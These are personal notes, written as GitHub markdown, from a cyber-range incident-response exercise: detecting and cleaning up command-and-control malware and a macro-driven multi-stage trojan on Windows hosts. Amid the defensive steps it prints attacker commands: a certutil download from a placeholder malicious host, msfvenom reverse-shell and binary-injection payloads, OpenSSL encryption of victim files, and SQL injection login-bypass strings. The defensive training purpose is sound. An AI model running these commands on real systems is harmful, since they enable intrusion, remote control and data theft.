<!--
Title: ASD Live Fire Exchange Programme (GitHub Markdown Version)
Author: Simon .I
Version: 2025.03.30
Description: GitHub-compatible Markdown (GHM) version using supported HTML like <details> and <table>.
-->

<!-- ASD Programme Title -->
<h1 align="center"><strong style="font-size: 4.5rem; letter-spacing: 4px; color: navy;">Australian Signals Directorate - Live Fire Exchange Program</strong></h1>

<p><strong>These are my personal notes from the <em>ASD Live Fire Cyberbitrange</em> event. This document is not provided by or affiliated with the <em>Australian Signals Directorate (ASD)</em> or <em>CyberbitRange</em>.</strong></p>

---

<details>

<summary><strong>🌐 LFE 1 Bangalore - Email Dumper</strong></summary>

### 🔎 Scenario: Command and Control (C2) Detection

This exercise focuses on analysing a compromised Windows host. The attacker leverages built-in Windows binaries like `certutil` and `powershell -enc` for malicious activities. The goal is to detect the infection, investigate indicators, and remove persistence and network access.

### 🧱 Step 1: Detect Suspicious Process Execution

Start with identifying potentially malicious running processes:

```powershell
tasklist | findstr /i "powershell cmd python wscript cscript mshta wmic rundll32 regsvr32 schtasks bitsadmin"
```

You can also use the Task Manager GUI:

```powershell
taskmgr
```

Kill any suspicious or known malicious process:

```powershell
taskkill /F /PID <PID>
```

Open Event Viewer to examine process creation logs:

```powershell
eventvwr
```

> Navigate to: Windows Logs > Security  
> Look for Event ID `4688` (Process Creation)

🧠 **Pay attention to:**

- **New Process Name**: The binary executed  
- **Creator Process Name**: What launched it  
- **Process Command Line**: (if command line logging is enabled)

Enable command line auditing via Group Policy:

`Computer Configuration > Administrative Templates > System > Audit Process Creation > Include command line in process creation events`

---

### 📥 Step 2: Investigate Certutil Abuse

Attackers often abuse `certutil` to download payloads from the internet:

```powershell
certutil -urlcache -split -f http://malicious.domain/agent.exe agent.exe
```

Check logs (Event Viewer or Sysmon if enabled) for this command line string.

---

### 🧪 Step 3: Decode Obfuscated PowerShell

If you encounter a base64 encoded PowerShell command:

```powershell
powershell.exe -enc <base64string>
```

Decode it using this:

```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<base64string>"))
```

---

### 🗓 Step 4: Investigate Scheduled Tasks

List scheduled tasks and find non-default or suspicious ones:

```powershell
schtasks /query /fo LIST /v
```

Or with PowerShell:

```powershell
Get-ScheduledTask | Where-Object {
  $_.TaskPath -notmatch "^\\Microsoft\\Windows" -and 
  ($_.Actions | ForEach-Object { $_.Execute }) -match "cmd|powershell|python|wscript|cscript|.bat|.vbs|.js|.py|mshta|rundll32|schtasks|bitsadmin"
}
```

Remove malicious scheduled task:

```powershell
Unregister-ScheduledTask -TaskName "<SuspiciousTaskName>" -Confirm:$false
```

---

### 🧼 Step 5: Registry Persistence

Check `Run` keys used to maintain persistence:

```powershell
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

Also check:

```powershell
regedit
```

---

### 🌐 Step 6: Inspect Network Connections

View active network connections and the processes behind them:

```powershell
netstat -bano
```

> Match suspicious PIDs with output from `tasklist`

---

### 📁 Step 7: Investigate Dropped Files

Search for document files and other suspicious files across users' folders:

```powershell
Get-ChildItem -Path C:\Users -Include *.docx,*.xlsx,*.pdf -File -Recurse -ErrorAction SilentlyContinue
```

</details>

---

<details>

<summary><strong>🌋 LFE 2 Jakarta - Killer Trojan</strong></summary>

### 🔎 Scenario: Multi-Stage Malware with Data Exfiltration

This scenario focuses on detecting and analysing a multi-stage malware campaign initiated by a phishing email with a malicious macro. The infection chain leads to PowerShell-based payloads, encrypted file exfiltration, and even web application exploitation using SQL injection. The defender’s objective is to identify all attack stages, remove persistence, and understand the tools used.

---

### 📥 Step 1: Initial Malware Infection via Office Macro

Malicious document contains an embedded macro (likely `.doc` or `.docm` format). 

Use **oletools** to analyse the macro contents:

```powershell
olevba -r C:\Path\To\Folder\*

# Optional:
olevba -r --decode C:\Path\To\Folder\*
olevba -r --json C:\Path\To\Folder\*
```

Check macro static flags:

```powershell
mraptor malicious.doc
```

Extract embedded objects (payloads):

```powershell
oleobj -e -d extracted malicious.doc
```

If it’s an RTF file:

```powershell
rtfobj -d extracted malicious.rtf
```

> 🧠 These tools help identify:
> - Auto-execution macros
> - Embedded scripts or executables
> - Hidden payloads

---

### 🧪 Step 2: Decode Obfuscated Payload (PowerShell)

Extracted macros typically drop or run PowerShell commands with obfuscation like Base64:

```powershell
powershell.exe -enc <Base64String>
```

Decode:

```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<Base64String>"))
```

---

### 💣 Step 3: Analyse the Payload (msfvenom-based)

Attacker-generated reverse shell created using `msfvenom`. Example:

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o agent.exe
```

Injected into another binary:

```powershell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x C:\Windows\System32\calc.exe -f exe -o payload.exe -e x86/shikata_ga_nai -i 3
```

> 🎯 Look for suspicious dropped EXEs like `agent.exe`, `payload.exe`, etc.

---

### 🔐 Step 4: Local File Encryption with OpenSSL

Attacker encrypts local files before exfiltration using OpenSSL:

```powershell
openssl enc -aes-256-cbc -base64 -in "C:\Users\victim\Documents\secret.txt" -out "C:\Users\victim\Documents\secret.enc" -K <hex_key> -iv 0
```

---

### 📡 Step 5: Monitor Network Activity (C2 & Exfil)

Use tools like `netstat` to identify open reverse shells or unusual IPs:

```powershell
netstat -ano
```

If using Wireshark or PCAPs, apply relevant filters:

```wireshark
frame.number == 1437
frame.number >= 1434 and frame.number <= 1440
tcp.analysis.retransmission
frame.number == 1437 and tcp.analysis.retransmission
```

> 🔍 Look for signs of:
> - Reverse shell traffic
> - Encrypted file transfer
> - Command & Control (C2) channels

---

### 🗓 Step 6: Check for Persistence (Scheduled Tasks / Registry)

Check for new scheduled tasks created by the payload:

```powershell
schtasks /query /fo LIST /v
```

Or with PowerShell:

```powershell
Get-ScheduledTask | Where-Object {
  $_.TaskPath -notmatch "^\\Microsoft\\Windows" -and 
  ($_.Actions | ForEach-Object { $_.Execute }) -match "cmd|powershell|python|.bat|wscript|schtasks"
}
```

Check registry persistence:

```powershell
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

---

### 🧬 Step 7: SQL Injection Web Exploit

The attacker attempts to exploit a login form using SQLi to access a database.

Try inputs like:

```
Username: ' OR 1=1;--
Password: anything
```

Or more advanced:

```
Username: ' UNION SELECT null, version();--
Password: anything
```

Likely back-end query:

```sql
SELECT * FROM users WHERE username = '' OR 1=1;--' AND password = '';
```

> 🧠 This can allow data access, dump credentials, or modify data.

---

### 🧹 Step 8: Remediation & Defence

- Kill malicious processes:
```powershell
taskkill /F /PID <PID>
```

- Delete scheduled tasks:
```powershell
Unregister-ScheduledTask -TaskName "<Name>" -Confirm:$false
```

- Remove registry autoruns:
```powershell
reg delete HKCU\...\Run /v <ValueName> /f
```

- Block malicious IPs on the firewall:
```powershell
New-NetFirewallRule -DisplayName "Block C2" -Direction Outbound -RemoteAddress <IP> -Action Block
```

</details>

---
